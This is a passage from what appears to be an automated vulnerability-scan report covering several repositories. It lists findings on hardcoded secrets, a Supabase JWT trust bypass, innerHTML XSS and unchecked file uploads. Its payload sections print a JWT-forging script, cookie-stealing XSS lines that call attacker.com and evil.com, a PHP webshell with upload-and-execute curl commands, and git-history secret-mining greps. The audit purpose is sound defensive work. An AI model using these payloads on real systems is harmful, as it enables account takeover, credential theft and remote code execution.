# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/tests/auth.test.ts:83`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:83` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:83
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/tests/auth.test.ts:101`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:101` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:101
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/tests/auth.test.ts:110`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:110` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:110
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/tests/auth.test.ts:116`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:116` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:116
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/tests/auth.test.ts:226`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:226` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:226
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/tests/auth.test.ts:269`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:269` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:269
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/public/js/mock/users.js:17`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/public/js/mock/users.js:17` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/public/js/mock/users.js:17
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/public/js/mock/users.js:25`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/public/js/mock/users.js:25` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/public/js/mock/users.js:25
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/public/js/mock/users.js:34`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/public/js/mock/users.js:34` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/public/js/mock/users.js:34
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `RealTools/tests/fixtures/score-card-e2e.ts:28`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `RealTools/tests/fixtures/score-card-e2e.ts:28` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at RealTools/tests/fixtures/score-card-e2e.ts:28
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S018] Supabase getSession() on server
**Type:** Auth Bypass via getSession() JWT Trust  
**Severity:** 🔴 CRITICAL  
**Location:** `BuildLog/src/contexts/AuthContext.jsx:11`  
**Privilege Gain:** `unauth → any_user_or_admin`

`getSession()` at `BuildLog/src/contexts/AuthContext.jsx:11` reads the JWT from the client cookie and trusts its claims without calling Supabase's auth server to verify. Attacker crafts a JWT with any `sub` (user ID) or custom role claim. All server-side auth checks that use this session are bypassed. Attacker impersonates any user, including admins.

**Payload:**
```
# Project ref detected: example
# Cookie name: sb-example-auth-token
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=').decode()
payload = {"sub": "00000000-0000-0000-0000-000000000001",
           "role": "authenticated", "user_metadata": {"role": "admin"},
           "app_metadata": {"role": "admin"}, "exp": 9999999999}
enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f'{header}.{enc}.invalid_signature'
# curl: -H 'Cookie: sb-example-auth-token=<forged>'
```

**Example:**
```bash
# getSession() at BuildLog/src/contexts/AuthContext.jsx:11 trusts client JWT without server verification
curl /api/admin-endpoint \
  -H 'Cookie: sb-example-auth-token=<forged_jwt>'
```

**Impact:** Impersonate any user, bypass all authorization, full admin takeover

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `tests/location-intelligence.test.mjs:98`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `tests/location-intelligence.test.mjs:98` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at tests/location-intelligence.test.mjs:98
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `Whatsbot/tests/setup-env.js:6`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `Whatsbot/tests/setup-env.js:6` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at Whatsbot/tests/setup-env.js:6
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `Whatsbot/tests/setup-env.js:10`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `Whatsbot/tests/setup-env.js:10` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at Whatsbot/tests/setup-env.js:10
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `DMDI/webshop/tests/app.test.ts:14`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/app.test.ts:14` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/app.test.ts:14
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `DMDI/webshop/tests/phase1-smoke.test.ts:12`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/phase1-smoke.test.ts:12` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/phase1-smoke.test.ts:12
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `DMDI/webshop/tests/auth.test.ts:10`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:10` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:10
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `DMDI/webshop/tests/env.test.ts:10`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/env.test.ts:10` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/env.test.ts:10
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `DMDI/webshop/tests/env.test.ts:39`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/env.test.ts:39` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/env.test.ts:39
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `DMDI/webshop/public/js/utils/html.js:11`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `DMDI/webshop/public/js/utils/html.js:11`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at DMDI/webshop/public/js/utils/html.js:11
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `supabase/config.toml:95`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `supabase/config.toml:95` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at supabase/config.toml:95
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `supabase/config.toml:287`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `supabase/config.toml:287` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at supabase/config.toml:287
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003g] Hardcoded secret/token
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🟠 HIGH  
**Location:** `supabase/config.toml:319`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `supabase/config.toml:319` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at supabase/config.toml:319
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/deals/activity-log-section.tsx:36`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/deals/activity-log-section.tsx:36` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/deals/activity-log-section.tsx:36
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/deals/activity-log-section.tsx:51`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/deals/activity-log-section.tsx:51` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/deals/activity-log-section.tsx:51
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/files/files-section.tsx:38`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/files/files-section.tsx:38` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/files/files-section.tsx:38
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/files/files-section.tsx:56`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/files/files-section.tsx:56` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/files/files-section.tsx:56
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/files/files-section.tsx:58`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/files/files-section.tsx:58` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/files/files-section.tsx:58
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/files/files-section.tsx:60`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/files/files-section.tsx:60` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/files/files-section.tsx:60
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/files/files-section.tsx:94`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/files/files-section.tsx:94` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at components/files/files-section.tsx:94
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `components/files/files-section.tsx:110`  
**Privilege Gain:** `user → server_rce`

Upload handler at `components/files/files-section.tsx:110` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
